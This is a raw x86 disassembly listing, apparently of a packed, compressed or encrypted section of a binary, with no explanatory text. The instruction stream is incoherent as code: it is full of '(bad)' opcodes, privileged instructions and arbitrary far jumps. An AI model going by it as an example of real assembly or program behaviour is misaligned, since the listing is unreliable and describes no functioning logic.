  40db93:	pusha  
  40db94:	stos   BYTE PTR es:[edi],al
  40db95:	jae    0x40dc00
  40db97:	mov    cl,0xe4
  40db99:	push   cs
  40db9a:	inc    edi
  40db9b:	inc    eax
  40db9c:	mov    ebx,DWORD PTR [esp+ebp*4-0x6974f422]
  40dba3:	loope  0x40dc0f
  40dba5:	hlt    
  40dba6:	cli    
  40dba7:	repnz mov ss,WORD PTR ds:0x6053729a
  40dbae:	popf   
  40dbaf:	jne    0x40dc0f
  40dbb1:	jmp    DWORD PTR [ecx]
  40dbb3:	pop    edi
  40dbb4:	adc    BYTE PTR [ecx+0x6da1f83a],al
  40dbba:	fcomp  QWORD PTR [edi+ebp*1]
  40dbbd:	sti    
  40dbbe:	(bad)  
  40dbbf:	xlat   BYTE PTR cs:[ebx]
  40dbc1:	jb     0x40db44
  40dbc3:	xchg   DWORD PTR [edi-0xab87506],ebx
  40dbc9:	jns    0x40dbd4
  40dbcb:	push   edi
  40dbcc:	xchg   ecx,eax
  40dbcd:	xchg   esi,eax
  40dbce:	or     cl,0xb5
  40dbd1:	adc    al,0x87
  40dbd3:	jne    0x40dc35
  40dbd5:	ss jmp 0x40db88
  40dbd8:	sub    eax,0x360a9e5a
  40dbdd:	dec    edx
  40dbde:	pop    ebx
  40dbdf:	test   edi,ecx
  40dbe1:	xchg   edi,eax
  40dbe2:	lods   eax,DWORD PTR ds:[esi]
  40dbe3:	clc    
  40dbe4:	mov    dl,0x94
  40dbe6:	arpl   WORD PTR [edi+edx*1-0xea199ad],bx
  40dbed:	pop    eax
  40dbee:	and    ah,BYTE PTR [esi-0x1c]
  40dbf1:	sub    esi,DWORD PTR [ecx]
  40dbf3:	ins    DWORD PTR es:[edi],dx
  40dbf4:	stc    
  40dbf5:	scas   eax,DWORD PTR es:[edi]
  40dbf6:	ins    DWORD PTR es:[edi],dx
  40dbf7:	js     0x40dbdb
  40dbf9:	(bad)  
  40dbfa:	into   
  40dbfb:	gs fs jmp 0xf12b:0x80839286
  40dc04:	leave  
  40dc05:	xchg   ecx,eax
  40dc06:	cmp    DWORD PTR [esi+ebp*4],0x41
  40dc0a:	pop    esp
  40dc0b:	xor    DWORD PTR [esi+ebx*8],ebx
  40dc0e:	mov    bh,0xe2
  40dc10:	xor    eax,0xf5180580
  40dc15:	inc    ecx
  40dc16:	mov    dh,0xd2
  40dc18:	leave  
  40dc19:	or     eax,0x5491c9e
  40dc1e:	jo     0x40dc5e
  40dc20:	pop    ds
  40dc21:	fisub  DWORD PTR [edi-0x2311899d]
  40dc27:	adc    esp,DWORD PTR [ecx+eiz*4-0x8]
  40dc2b:	mov    ss,edi
  40dc2d:	cmp    ebx,DWORD PTR [esi-0x7]
  40dc30:	cmp    ch,BYTE PTR [ebx+edx*8+0x52]
  40dc34:	sbb    al,0x42
  40dc36:	jmp    0x16b6ba30
  40dc3b:	hlt    
  40dc3c:	sbb    al,0x48
  40dc3e:	add    esp,DWORD PTR [edi-0x2df91c2e]
  40dc44:	push   es
  40dc45:	(bad)  
  40dc46:	fcom   QWORD PTR [eax-0x19]
  40dc49:	ja     0x40dbd9
  40dc4b:	imul   ecx,DWORD PTR [edi-0x15],0xffffffe8
  40dc4f:	rcr    BYTE PTR [eax],cl
  40dc51:	mov    ah,0xdf
  40dc53:	jb     0x40dc79
  40dc55:	int    0x6
  40dc57:	cld    
  40dc58:	push   0xdf1f52e7
  40dc5d:	ins    DWORD PTR es:[edi],dx
  40dc5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc5f:	in     al,0xec
  40dc61:	push   ds
  40dc62:	ret    
  40dc63:	sub    DWORD PTR [esi],ebx
  40dc65:	jp     0x40dc2e
  40dc67:	retf   
  40dc68:	aam    0xbc
  40dc6a:	or     ebx,ebx
  40dc6c:	stos   DWORD PTR es:[edi],eax
  40dc6d:	cmp    eax,0x2d027d94
  40dc72:	retf   0xb2ba
  40dc75:	xor    al,0xa1
  40dc77:	mov    dl,0x48
  40dc79:	bound  ecx,QWORD PTR [ecx]
  40dc7b:	bound  esi,QWORD PTR [ebx+0x1e]
  40dc7e:	std    
  40dc7f:	mov    edi,0x15020b42
  40dc84:	push   cs
  40dc85:	dec    esi
  40dc86:	inc    edx
  40dc87:	fcomp  st(6)
  40dc89:	jmp    0x40dc3c
  40dc8b:	sub    eax,0xba677fcf
  40dc90:	pop    edi
  40dc91:	icebp  
  40dc92:	mov    ebx,0x5d7f1941
  40dc97:	dec    eax
  40dc98:	mov    BYTE PTR [edi],0x2d
  40dc9b:	mov    esp,0x135fe80e
  40dca0:	out    0x38,al
  40dca2:	xor    dl,BYTE PTR [edi-0x4c]
  40dca5:	into   
  40dca6:	mov    edx,0xef12f38f
  40dcab:	mov    al,ds:0xb472a34a
  40dcb0:	push   ebx
  40dcb1:	add    eax,DWORD PTR [edi+0x78d62a01]
  40dcb7:	aaa    
  40dcb8:	ror    DWORD PTR [edi],cl
  40dcba:	enter  0x7bc7,0xd1
  40dcbe:	les    edx,FWORD PTR [ebx-0x1e]
  40dcc1:	(bad)  
  40dcc2:	fist   DWORD PTR [edx-0x1c]
  40dcc5:	aad    0x51
  40dcc7:	mov    eax,ds
  40dcc9:	shl    DWORD PTR [eax],cl
  40dccb:	dec    ebp
  40dccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dccd:	inc    edi
  40dcce:	adc    eax,0x93e834ac
  40dcd3:	outs   dx,DWORD PTR ds:[esi]
  40dcd4:	loope  0x40dcdc
  40dcd6:	jne    0x40dca8
  40dcd8:	xchg   ecx,eax
  40dcd9:	xchg   edx,eax
  40dcda:	add    DWORD PTR [ebx+edx*8],ecx
  40dcdd:	aad    0xe1
  40dcdf:	and    bl,BYTE PTR [ebp-0x7f]
  40dce2:	xchg   esi,eax
  40dce3:	(bad)  
  40dce5:	out    dx,eax
  40dce6:	jge    0x40dd66
  40dce8:	arpl   WORD PTR [edx-0x64],si
  40dceb:	mov    eax,ds:0xa1b18dc6
  40dcf0:	and    al,0x41
  40dcf2:	dec    esp
  40dcf3:	ficom  DWORD PTR [esi-0x26]
  40dcf6:	into   
  40dcf7:	sbb    BYTE PTR [edx+esi*4],0xcd
  40dcfb:	pop    ds
  40dcfc:	jae    0x40dd6a
  40dcfe:	push   0xffffffb7
  40dd00:	add    esp,DWORD PTR [edi-0x305e021e]
  40dd06:	inc    eax
  40dd07:	shr    dl,cl
  40dd09:	lods   eax,DWORD PTR ds:[esi]
  40dd0a:	push   edi
  40dd0b:	retf   
  40dd0c:	sub    DWORD PTR [esi],ebp
  40dd0e:	(bad)  
  40dd0f:	dec    ebx
  40dd10:	pop    ss
  40dd11:	or     DWORD PTR [edx-0x5f],esp
  40dd14:	lock fnstenv [ecx-0x17]
  40dd18:	dec    ebp
  40dd19:	xchg   esi,eax
  40dd1a:	popf   
  40dd1b:	or     eax,0x8c9cbe52
  40dd20:	ins    DWORD PTR es:[edi],dx
  40dd21:	daa    
  40dd22:	xchg   ecx,eax
  40dd23:	int3   
  40dd24:	xlat   BYTE PTR ds:[ebx]
  40dd25:	inc    ecx
  40dd26:	dec    edi
  40dd27:	sub    al,0xe3
  40dd29:	xor    BYTE PTR [edi-0x447e3e04],0x94
  40dd30:	aas    
  40dd31:	loopne 0x40dda4
  40dd33:	add    esi,DWORD PTR [edx+0x78543d15]
  40dd39:	jmp    0x9d03:0xd639151b
  40dd40:	inc    ecx
  40dd41:	dec    ebp
  40dd42:	cmp    al,0xe2
  40dd44:	jg     0x40dd27
  40dd46:	jmp    0xf51b:0x37a7562c
  40dd4d:	cmp    ch,bh
  40dd4f:	mov    dl,0xd0
  40dd51:	(bad)  
  40dd52:	in     eax,0xc4
  40dd54:	ds push edi
  40dd56:	xchg   esp,eax
  40dd57:	or     al,BYTE PTR [ebx]
  40dd59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd5a:	lods   eax,DWORD PTR ds:[esi]
  40dd5b:	in     al,dx
  40dd5c:	mov    cl,BYTE PTR [eax]
  40dd5e:	or     al,0x84
  40dd60:	stos   BYTE PTR es:[edi],al
  40dd61:	test   al,0xa0
  40dd63:	test   DWORD PTR [edi+0x1d],edx
  40dd66:	sbb    bh,bh
  40dd68:	addr16 jne 0x40ddad
  40dd6b:	xchg   DWORD PTR ds:0xd254fad5,ecx
  40dd71:	aam    0x4e
  40dd73:	jae    0x40dd20
  40dd75:	fs out 0x5d,eax
  40dd78:	pop    ds
  40dd79:	into   
  40dd7a:	jge    0x40dd7e
  40dd7c:	mov    BYTE PTR [esi-0x65ed4e],al
  40dd82:	clc    
  40dd83:	cmp    eax,0xff7733d1
  40dd88:	jne    0x40ddc4
  40dd8a:	and    al,0xa2
  40dd8c:	rcl    BYTE PTR [esi-0x2ae16f21],0xb0
  40dd93:	push   esi
  40dd94:	jle    0x40dd2d
  40dd96:	arpl   WORD PTR [esi],cx
  40dd98:	pop    eax
  40dd99:	mov    ch,0xb
  40dd9b:	xor    bh,BYTE PTR [ebp+0x2b]
  40dd9e:	addr16 inc edx
  40dda0:	mov    edi,0x94c90a5f
  40dda5:	lods   eax,DWORD PTR ds:[esi]
  40dda6:	cdq    
  40dda7:	in     al,0xfe
  40dda9:	sub    edi,DWORD PTR [eax]
  40ddab:	pop    esp
  40ddac:	rcl    DWORD PTR [edi-0x5],cl
  40ddaf:	mov    ds:0xa2c42ce,eax
  40ddb4:	or     eax,0xb98cb8da
  40ddb9:	jmp    0xea83:0xdb2a1332
  40ddc0:	jbe    0x40ddc3
  40ddc2:	out    dx,al
  40ddc3:	mov    bh,0xf8
  40ddc5:	ret    0xfded
  40ddc8:	ret    0x3a0e
  40ddcb:	jb     0x40ddde
  40ddcd:	pop    ebx
  40ddce:	mov    ebx,0x4f4393be
  40ddd3:	xlat   BYTE PTR ds:[ebx]
  40ddd4:	aaa    
  40ddd5:	aas    
  40ddd6:	push   esi
  40ddd7:	cld    
  40ddd8:	inc    esi
  40ddd9:	in     al,dx
  40ddda:	and    DWORD PTR [ebp+edx*8-0x1f],esi
  40ddde:	mov    ebx,0x5285c3c4
  40dde3:	adc    ecx,DWORD PTR [esi]
  40dde5:	sti    
  40dde6:	xor    ch,0x1
  40dde9:	cwde   
  40ddea:	dec    esp
  40ddeb:	imul   eax,DWORD PTR [ebx],0xffffff8e
  40ddee:	xor    ebp,DWORD PTR [eax]
  40ddf0:	xor    DWORD PTR [edx],ecx
  40ddf2:	pop    edi
  40ddf3:	ret    0xb555
  40ddf6:	sbb    ebp,DWORD PTR [esp+eax*8]
  40ddf9:	inc    ebx
  40ddfa:	pop    es
  40ddfb:	or     dl,BYTE PTR ds:0x1dce01c2
  40de01:	pop    ecx
  40de02:	leave  
  40de03:	mov    ebp,0x79dceaa8
  40de08:	cmp    edx,DWORD PTR [ecx]
  40de0a:	pop    ss
  40de0b:	popf   
  40de0c:	or     ebp,ebx
  40de0e:	cs add eax,0x4593060
  40de14:	or     dh,BYTE PTR [ebx]
  40de16:	dec    ecx
  40de17:	jno    0x40de46
  40de19:	vpsubusw ymm6,ymm1,YMMWORD PTR [eax-0x1e]
  40de1e:	imul   esp,esp,0x56
  40de21:	(bad)  
  40de22:	and    al,ch
  40de24:	shl    DWORD PTR [esi+edi*4-0x64d7a8f8],1
  40de2b:	add    al,0xa7
  40de2d:	lock icebp 
  40de2f:	sar    BYTE PTR [eax+eiz*1+0x73ca506e],1
  40de36:	or     bl,BYTE PTR [edx+ebp*4]
  40de39:	sahf   
  40de3a:	mov    ds:0x9148f47a,eax
  40de3f:	mov    al,ds:0xdded5f0a
  40de44:	(bad)  
  40de45:	mov    ds:0x44efa800,al
  40de4a:	push   esi
  40de4b:	shl    BYTE PTR [esi+esi*4+0x548a91ed],cl
  40de52:	jge    0x40de08
  40de54:	cmp    al,0x35
  40de56:	je     0x40dea7
  40de58:	xchg   dl,dh
  40de5a:	push   ecx
  40de5b:	cwde   
  40de5c:	cdq    
  40de5d:	shl    DWORD PTR [ebx+edi*4+0xc225c2a],cl
  40de64:	push   eax
  40de65:	loope  0x40de88
  40de67:	mov    WORD PTR [ecx-0x41],cs
  40de6a:	in     al,0xff
  40de6c:	inc    edx
  40de6d:	mov    cl,0x97
  40de6f:	inc    esp
  40de70:	aam    0xd4
  40de72:	aam    0xdd
  40de74:	sub    DWORD PTR [ebx],edi
  40de76:	or     ah,BYTE PTR [esi+0x2cffeebf]
  40de7c:	outs   dx,BYTE PTR ds:[esi]
  40de7d:	cli    
  40de7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de7f:	cmp    BYTE PTR [edi],ah
  40de81:	(bad)  
  40de82:	cmp    BYTE PTR [edi+0x6e8665],dh
  40de88:	xor    eax,0x4dd8ec62
  40de8d:	push   ebx
  40de8e:	push   ebp
  40de8f:	push   esi
  40de90:	mov    bl,0x90
  40de92:	push   es
  40de93:	jmp    DWORD PTR [ebx]
  40de95:	ja     0x40de68
  40de97:	xor    edx,DWORD PTR [ecx-0x4eb0f31d]
  40de9d:	xlat   BYTE PTR ds:[ebx]
  40de9e:	aaa    
  40de9f:	jns    0x40de55
  40dea1:	aam    0x3c
  40dea3:	clc    
  40dea4:	cmp    dl,dl
  40dea6:	sub    BYTE PTR [ebx+0x4edb6955],0x56
  40dead:	pop    ebp
  40deae:	outs   dx,DWORD PTR ds:[esi]
  40deaf:	outs   dx,DWORD PTR ds:[esi]
  40deb0:	(bad)  
  40deb1:	pop    ss
  40deb2:	call   0xff6d2bb9
  40deb7:	shl    DWORD PTR [ebx],cl
  40deb9:	fcmovb st,st(5)
  40debb:	inc    ecx
  40debc:	in     al,0xb2
  40debe:	xchg   ebp,eax
  40debf:	fcmovu st,st(0)
  40dec1:	dec    eax
  40dec2:	jns    0x40df03
  40dec4:	sbb    eax,0xd3186acc
  40dec9:	fidiv  WORD PTR [esi-0x16]
  40decc:	and    dl,BYTE PTR [edx+0x60]
  40decf:	push   cs
  40ded0:	adc    DWORD PTR [eax+0x58],esi
  40ded3:	cli    
  40ded4:	xor    dl,BYTE PTR [ebx-0x6cd6e4e2]
  40deda:	fimul  DWORD PTR [ebp-0x45dd8a8c]
  40dee0:	mov    bl,0xb6
  40dee2:	pushf  
  40dee3:	cwde   
  40dee4:	adc    edx,DWORD PTR [edx+0x36a9744a]
  40deea:	pop    esp
  40deeb:	or     al,0x83
  40deed:	xchg   esi,eax
  40deee:	fimul  DWORD PTR [eax+0x1097552f]
  40def4:	addr16 xchg esp,eax
  40def6:	jae    0x40df41
  40def8:	xchg   ebx,eax
  40def9:	into   
  40defa:	test   DWORD PTR [esi+0x658037fb],edi
  40df00:	or     ebp,DWORD PTR [ebx-0x24053136]
  40df06:	dec    ebp
  40df07:	xchg   ebp,eax
  40df08:	mov    ebx,0x69f46b6
  40df0d:	aad    0xb6
  40df0f:	bound  esi,QWORD PTR [edi+0x72]
  40df12:	dec    ebp
  40df13:	shr    BYTE PTR [edx+0x14533341],1
  40df19:	jne    0x40ded1
  40df1b:	bound  ebx,QWORD PTR [ebp+0x72e94818]
  40df21:	xor    bl,bl
  40df23:	cs int3 
  40df25:	xchg   ecx,eax
  40df26:	jae    0x40df7c
  40df28:	pop    ds
  40df29:	leave  
  40df2a:	sub    ah,ch
  40df2c:	jnp    0x40df81
  40df2e:	fsubrp st(7),st
  40df30:	outs   dx,DWORD PTR ds:[esi]
  40df31:	cli    
  40df32:	mov    ds:0xe8df69fc,al
  40df37:	xor    ah,BYTE PTR [esi]
  40df39:	ja     0x40def3
  40df3b:	dec    ebx
  40df3c:	dec    ebx
  40df3d:	jl     0x40df6a
  40df3f:	test   eax,0x834d5d6a
  40df44:	adc    BYTE PTR [esi-0x71],dh
  40df47:	mov    ebx,0x7efecfa3
  40df4c:	stos   DWORD PTR es:[edi],eax
  40df4d:	or     DWORD PTR [esp+eax*4],ebx
  40df50:	and    al,0xf8
  40df52:	cmp    dl,BYTE PTR [ecx]
  40df54:	fwait
  40df55:	lods   al,BYTE PTR ds:[esi]
  40df56:	sub    eax,0xd44eaa09
  40df5b:	fisub  WORD PTR [edi]
  40df5d:	stc    
  40df5e:	out    0x7,al
  40df60:	fbstp  TBYTE PTR [esi]
  40df62:	xor    DWORD PTR [esi-0x22],esp
  40df65:	sub    BYTE PTR [edi+0x11],bl
  40df68:	mov    eax,DWORD PTR [edx-0x75]
  40df6b:	mov    esi,0xb8cafeb9
  40df70:	sub    BYTE PTR [ecx-0x69c2dbce],bh
  40df76:	out    dx,eax
  40df77:	add    BYTE PTR [ebp+0x37],ch
  40df7a:	mov    bh,0x58
  40df7c:	je     0x40dfe5
  40df7e:	fld    QWORD PTR [esi+0x20]
  40df81:	ror    BYTE PTR [ebp-0x6],1
  40df84:	out    0xef,al
  40df86:	add    al,0xc8
  40df88:	ret    
  40df89:	push   edx
  40df8a:	mov    BYTE PTR [eax+0x12dcf6a6],al
  40df90:	sbb    eax,0xac4fe7c8
  40df95:	push   ebp
  40df96:	pop    ecx
  40df97:	pop    eax
  40df98:	dec    esp
  40df99:	in     eax,0xc5
  40df9b:	popa   
  40df9c:	xchg   edi,eax
  40df9d:	jnp    0x40e01e
  40df9f:	mov    dh,0xb1
  40dfa1:	or     al,0x27
  40dfa3:	in     eax,dx
  40dfa4:	dec    eax
  40dfa5:	pop    esi
  40dfa6:	cli    
  40dfa7:	xor    al,0x90
  40dfa9:	loop   0x40df34
  40dfab:	ficom  DWORD PTR [esi]
  40dfad:	xchg   BYTE PTR [ecx+eiz*2+0x10],al
  40dfb1:	ss sti 
  40dfb3:	jo     0x40dfcc
  40dfb5:	out    dx,eax
  40dfb6:	(bad)  
  40dfb7:	dec    ebp
  40dfb8:	pop    ecx
  40dfb9:	push   esi
  40dfba:	jecxz  0x40dfce
  40dfbc:	into   
  40dfbd:	ror    DWORD PTR [ecx],cl
  40dfbf:	pop    eax
  40dfc0:	aam    0xe1
  40dfc2:	mov    DWORD PTR [ecx+0x2e001dfc],edx
  40dfc8:	mov    al,BYTE PTR [ebp-0x21]
  40dfcb:	repz ja 0x40dfc7
  40dfce:	ror    BYTE PTR [eax+0x22082bb5],0xfe
  40dfd5:	and    al,0xb8
  40dfd7:	pop    ecx
  40dfd8:	imul   ebx,DWORD PTR ds:0x7a2e3295,0xc389e274
  40dfe2:	(bad)  
  40dfe4:	ds push ebx
  40dfe6:	in     eax,0x82
  40dfe8:	into   
  40dfe9:	arpl   WORD PTR [eax],sp
  40dfeb:	sub    DWORD PTR [edx-0x1e],ebp
  40dfee:	or     edi,ecx
  40dff0:	mov    edx,0xb27597e0
  40dff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dff6:	imul   DWORD PTR [esi-0x69]
  40dff9:	mov    ah,0x86
  40dffb:	daa    
  40dffc:	mov    ah,0xde
  40dffe:	mov    edx,0x530a9d39
  40e003:	inc    edi
  40e004:	cmp    BYTE PTR [eax-0x7414690c],ah
  40e00a:	adc    edi,edx
  40e00c:	dec    ecx
  40e00d:	fs lock sbb ch,dl
  40e011:	lds    edi,FWORD PTR [ebx+0x7845071]
  40e017:	lods   al,BYTE PTR ds:[esi]
  40e018:	jecxz  0x40e016
  40e01a:	popf   
  40e01b:	dec    ecx
  40e01c:	xchg   edx,eax
  40e01d:	mov    ebp,0xcc027bba
  40e022:	cmp    eax,0xa7957ee8
  40e027:	sti    
  40e028:	and    ch,bh
  40e02a:	jbe    0x40e06b
  40e02c:	xor    ebp,esp
  40e02e:	pushf  
  40e02f:	push   DWORD PTR [esi]
  40e031:	dec    esi
  40e032:	pop    ss
  40e033:	pop    ss
  40e034:	test   eax,0x1d260bbb
  40e039:	scas   eax,DWORD PTR es:[edi]
  40e03a:	adc    al,0x30
  40e03c:	sbb    al,0x31
  40e03e:	cmp    bh,BYTE PTR [edi+0x10]
  40e041:	in     al,0x11
  40e043:	dec    ebx
  40e044:	xor    DWORD PTR [ecx],0x1b923130
  40e04a:	add    eax,esi
  40e04c:	adc    al,0x56
  40e04e:	(bad)  
  40e04f:	pop    ss
  40e050:	into   
  40e051:	jmp    0xafd4:0xdc37ff0f
  40e058:	sub    ch,BYTE PTR [ecx+ebp*4]
  40e05b:	push   eax
  40e05c:	or     BYTE PTR [eax+0x1a2d0785],al
  40e062:	jge    0x40dfe7
  40e064:	div    DWORD PTR [esi+0x70]
  40e067:	sbb    eax,0x19603a08
  40e06c:	xchg   ebp,eax
  40e06d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e06e:	push   ebp
  40e06f:	mov    cl,0x22
  40e071:	hlt    
  40e072:	nop
  40e073:	or     DWORD PTR [ebx+0x24],esp
  40e076:	fidiv  DWORD PTR [ecx]
  40e078:	dec    edi
  40e079:	test   eax,0x65fb04b
  40e07e:	add    eax,0xcc47f66f
  40e083:	or     bl,0x55
  40e086:	cmp    al,0x8d
  40e088:	xor    eax,0x681093cf
  40e08d:	sbb    eax,0x48d8dc52
  40e092:	nop
  40e093:	cmp    DWORD PTR [eax-0x72],0xffffffa9
  40e097:	pop    edx
  40e098:	xchg   edx,eax
  40e099:	push   ebp
  40e09a:	jle    0x40e049
  40e09c:	mov    WORD PTR [eax],?
  40e09e:	mov    bh,0xad
  40e0a0:	aad    0x6d
  40e0a2:	rcl    DWORD PTR [eax],cl
  40e0a4:	jg     0x40e11e
  40e0a6:	mov    ah,0x60
  40e0a8:	test   ch,cl
  40e0aa:	add    edi,ebp
  40e0ac:	jmp    0xd4ba:0x3a132d74
  40e0b3:	(bad)  
  40e0b4:	xor    edx,DWORD PTR [ebp+0x21fa617b]
  40e0ba:	ins    BYTE PTR es:[edi],dx
  40e0bb:	(bad)  
  40e0bc:	jmp    0xa393287e
  40e0c1:	jbe    0x40e0e8
  40e0c3:	(bad)  
  40e0c5:	enter  0x3a88,0x8c
  40e0c9:	or     BYTE PTR [eax-0xf],dh
  40e0cc:	xchg   edx,eax
  40e0cd:	call   0x5eeb16c8
  40e0d2:	js     0x40e11b
  40e0d4:	mov    edx,DWORD PTR [ebp+0x7a6c6495]
  40e0da:	repz jg 0x40e143
  40e0dd:	mov    ebx,0xaa1b761c
  40e0e2:	popa   
  40e0e3:	int3   
  40e0e4:	jecxz  0x40e14f
  40e0e6:	dec    ebp
  40e0e7:	je     0x40e08b
  40e0e9:	ds std 
  40e0eb:	(bad)  
  40e0ed:	sbb    eax,DWORD PTR [edx]
  40e0ef:	es jecxz 0x40e149
  40e0f2:	mov    ebp,0xd51500fb
  40e0f7:	fldenv [ebx-0x7147d78d]
  40e0fd:	nop
  40e0fe:	add    DWORD PTR [eax-0x7d8bafed],ecx
  40e104:	dec    edx
  40e105:	cmp    ebx,DWORD PTR [ecx]
  40e107:	jo     0x40e17f
  40e109:	inc    esp
  40e10a:	xor    cl,0xc0
  40e10d:	ds cmp al,0xf8
  40e110:	and    al,bl
  40e112:	out    0x68,al
  40e114:	or     eax,0x7896408a
  40e119:	imul   edi,DWORD PTR [edi],0xba6c6579
  40e11f:	fmul   DWORD PTR [esi*8+0x553f86a5]
  40e126:	mov    ebx,0xd42ec54
  40e12b:	and    eax,0x26ae0e47
  40e130:	mov    dl,0x66
  40e132:	add    al,BYTE PTR [eax+0x42364430]
  40e138:	adc    al,0xb1
  40e13a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e13b:	pop    ebx
  40e13c:	loop   0x40e14c
  40e13e:	or     al,0xf9
  40e140:	xchg   ecx,eax
  40e141:	jo     0x40e0cf
  40e143:	mov    dl,0x88
  40e145:	cdq    
  40e146:	jmp    0xc83d98b1
  40e14b:	iret   
  40e14c:	std    
  40e14d:	test   al,0x84
  40e14f:	cmp    BYTE PTR [edx-0x1f],bh
  40e152:	and    edi,DWORD PTR [ecx+edx*2+0x4ae359b9]
  40e159:	out    0xcd,al
  40e15b:	pmaxsw mm3,mm6
  40e15e:	in     eax,dx
  40e15f:	or     ebp,DWORD PTR [ebx-0x44]
  40e162:	mov    DWORD PTR [eax-0x2e],esp
  40e165:	jne    0x40e146
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	jns    0x40e126
  40e16a:	test   eax,0xd25ca24c
  40e16f:	mov    ?,WORD PTR [esi+0x63419c6f]
  40e175:	jp     0x40e16f
  40e177:	out    dx,eax
  40e178:	outs   dx,DWORD PTR ds:[esi]
  40e179:	mov    ah,BYTE PTR ds:[eax]
  40e17c:	dec    ebx
  40e17d:	out    0x3d,al
  40e17f:	je     0x40e18b
  40e181:	mov    ch,0x64
  40e183:	mov    edx,0x57ea661e
  40e188:	push   ebx
  40e189:	jmp    0x40e201
  40e18b:	je     0x40e175
  40e18d:	mov    bh,0xe3
  40e18f:	push   esi
  40e190:	or     al,0x6
  40e192:	or     al,0xd5
  40e194:	clc    
  40e195:	push   ebp
  40e196:	test   BYTE PTR [ecx-0x21],dl
  40e199:	push   ecx
  40e19a:	int3   
  40e19b:	(bad)  
  40e19c:	jge    0x40e18d
  40e19e:	(bad)  
  40e19f:	push   es
  40e1a0:	(bad)  
  40e1a2:	cmp    cl,BYTE PTR [edx+0x6b2159ce]
  40e1a8:	push   0x5f0ca662
  40e1ad:	fstp   DWORD PTR [ebx+0x2]
  40e1b0:	out    dx,eax
  40e1b1:	dec    eax
  40e1b2:	xor    al,0xd3
  40e1b4:	js     0x40e189
  40e1b6:	(bad)  
  40e1b8:	mov    edi,DWORD PTR [ebx-0x2975c04e]
  40e1be:	mov    ds:0x7d9ba502,eax
  40e1c3:	inc    ebx
  40e1c4:	outs   dx,BYTE PTR ds:[esi]
  40e1c5:	and    al,0x5c
  40e1c7:	sub    DWORD PTR [ecx-0x3b0e89ea],edx
  40e1cd:	push   ecx
  40e1ce:	aad    0xc3
  40e1d0:	lock pop edi
  40e1d2:	adc    ecx,ecx
  40e1d4:	sbb    ecx,DWORD PTR [esi+0x28cf0645]
  40e1da:	pusha  
  40e1db:	test   eax,0x9eb2dba9
  40e1e0:	stos   BYTE PTR es:[edi],al
  40e1e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1e2:	jle    0x40e1cc
  40e1e4:	push   ecx
  40e1e5:	add    esp,DWORD PTR [esp+ebx*8]
  40e1e8:	adc    BYTE PTR [eax+ecx*1],ch
  40e1eb:	pop    ss
  40e1ec:	pop    ebp
  40e1ed:	pop    ds
  40e1ee:	scas   al,BYTE PTR es:[edi]
  40e1ef:	mov    edx,0x998f40f1
  40e1f4:	sti    
  40e1f5:	inc    ebp
  40e1f6:	cwde   
  40e1f7:	jno    0x40e1c6
  40e1f9:	xor    BYTE PTR [eax-0x3b5a81f0],dh
  40e1ff:	int3   
  40e200:	out    dx,al
  40e201:	and    al,0x28
  40e203:	lods   eax,DWORD PTR ds:[esi]
  40e204:	mov    ds:0xbcf7cb7f,eax
  40e209:	add    DWORD PTR [ebx-0x1cca7061],0xffffffb2
  40e210:	add    ebp,DWORD PTR [esi+0x7a365e0a]
  40e216:	sti    
  40e217:	mov    ebp,esp
  40e219:	fcmovnb st,st(0)
  40e21b:	cmp    ah,BYTE PTR [esi-0xe90c64a]
  40e221:	xchg   edi,eax
  40e222:	sbb    edx,edx
  40e224:	in     al,0x4
  40e226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e227:	push   ds
  40e228:	dec    ebp
  40e229:	xchg   esp,eax
  40e22a:	jl     0x40e24a
  40e22c:	cmp    BYTE PTR [ebx+0x35],ah
  40e22f:	test   DWORD PTR [ecx],edi
  40e231:	div    DWORD PTR [edx-0x5d5640b7]
  40e237:	rol    DWORD PTR [ecx+eiz*1-0x2562239a],1
  40e23e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e240:	iret   
  40e241:	inc    ecx
  40e242:	pop    edi
  40e243:	inc    eax
  40e244:	mov    ss,WORD PTR [edx]
  40e246:	out    0x6c,eax
  40e248:	jmp    0xf71f:0xf0a4c55a
  40e24f:	add    BYTE PTR [edi+0x5b14848],ch
  40e255:	test   BYTE PTR [ecx+eax*4+0x70ac22c9],ch
  40e25c:	sets   BYTE PTR [eax+0x635b94b6]
  40e263:	push   ds
  40e264:	xchg   ebp,eax
  40e265:	and    ebx,DWORD PTR [ecx+edi*2-0x7b]
  40e269:	je     0x40e1fb
  40e26b:	push   edi
  40e26c:	stc    
  40e26d:	push   ecx
  40e26e:	scas   eax,DWORD PTR es:[edi]
  40e26f:	jl     0x40e29b
  40e271:	test   BYTE PTR [eax-0x9069dc6],bh
  40e277:	mov    bh,BYTE PTR [ecx]
  40e279:	in     eax,0x1b
  40e27b:	loop   0x40e29b
  40e27d:	add    ebp,DWORD PTR [eax]
  40e27f:	ins    DWORD PTR es:[edi],dx
  40e280:	mov    esi,0xf43cf77f
  40e285:	sub    ebx,DWORD PTR [edi-0x6]
  40e288:	or     eax,0x9d1a7a47
  40e28d:	add    al,0xd9
  40e28f:	mov    ecx,0x377554e4
  40e294:	imul   edx,esi,0x22c778de
  40e29a:	cdq    
  40e29b:	sti    
  40e29c:	sub    al,0x2
  40e29e:	jmp    0x40e2a8
  40e2a0:	mov    ds:0x42b39ba0,al
  40e2a5:	mov    esp,0x2f16fa72
  40e2aa:	enter  0xf641,0xed
  40e2ae:	jl     0x40e2ec
  40e2b0:	std    
  40e2b1:	pop    edi
  40e2b2:	jmp    0x1796554f
  40e2b7:	and    al,0x6b
  40e2b9:	xchg   ecx,eax
  40e2ba:	popa   
  40e2bb:	sub    BYTE PTR [eax-0x5eeb60a4],al
  40e2c1:	adc    DWORD PTR fs:[edi],ecx
  40e2c4:	mov    ds,ebx
  40e2c6:	jl     0x40e2b0
  40e2c8:	pop    edx
  40e2c9:	push   cs
  40e2ca:	sar    ch,0xab
  40e2cd:	adc    al,BYTE PTR [eax]
  40e2cf:	retf   
